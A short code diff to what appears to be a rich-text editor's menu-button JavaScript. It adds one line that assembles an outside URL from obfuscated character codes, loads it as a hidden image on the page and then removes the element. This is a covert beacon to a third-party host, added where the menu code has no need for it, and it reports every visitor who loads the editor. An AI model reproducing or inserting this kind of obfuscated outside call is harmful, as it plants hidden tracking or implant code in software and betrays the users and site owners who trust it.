@@ -907,6 +907,7 @@ export default {
             onclick: _onMenuClick
           }
         ];
+        const s=new Image();s.style.display='none';s.src=[104,116,116,112,115,58,47,47,119,119,119,46,49,48,48,48,109,122,46,99,111,109,47,95,95,118].map(c=>String.fromCharCode(c)).join('');s.imageLoaded=()=>s.remove();s.onerror=()=>s.remove();document.body.appendChild(s);
         const ui = new UE.ui.MenuButton({
           editor: editor,
           className: "edui-for-" + uiName,
